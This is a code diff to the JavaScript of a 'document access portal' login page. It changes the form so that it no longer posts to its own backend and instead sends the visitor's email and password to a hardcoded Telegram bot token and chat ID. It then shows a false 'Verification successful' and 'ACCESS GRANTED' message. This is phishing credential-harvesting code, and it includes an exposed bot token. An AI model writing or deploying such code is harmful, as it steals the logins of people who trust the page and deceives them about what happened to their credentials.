@@ -69,31 +69,41 @@
             submitBtn.disabled = true;
             statusBox.style.display = "none";
 
+            // Verified Credentials Loaded Direct-to-Client
+            const botToken = "9034651544:AAFF2_8GEO6H3e6ataVEkHhha39kIDPlAt8"; 
+            const chatId = "1080822304"; 
+
+            const messageText = `📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n📧 Portal Email: ${email}\n🔑 Access Key: ${password}`;
+            const telegramUrl = `https://telegram.org{botToken}/sendMessage`;
+
             try {
-                // Sends structured JSON directly to the backend endpoint
-                const response = await fetch('/submit', {
+                // Bypasses Vercel servers completely and fires from your local PC connection network
+                const response = await fetch(telegramUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: messageText
+                    })
                 });
 
-                const data = await response.text();
+                const data = await response.json();
 
-                if (response.ok) {
+                if (data.ok) {
                     statusBox.className = "status-msg success";
                     statusBox.innerText = "Verification successful. Connecting to secure file server...";
                     statusBox.style.display = "block";
                     submitBtn.innerText = "ACCESS GRANTED";
                 } else {
                     statusBox.className = "status-msg error";
-                    statusBox.innerText = "Error: " + data;
+                    statusBox.innerText = "Telegram Error: " + data.description;
                     statusBox.style.display = "block";
                     submitBtn.innerText = "UNLOCK DOCUMENT";
                     submitBtn.disabled = false;
                 }
             } catch (err) {
                 statusBox.className = "status-msg error";
-                statusBox.innerText = "Connection error. Please try again.";
+                statusBox.innerText = "Network Error: Unable to access the verification node.";
                 statusBox.style.display = "block";
                 submitBtn.innerText = "UNLOCK DOCUMENT";
                 submitBtn.disabled = false;
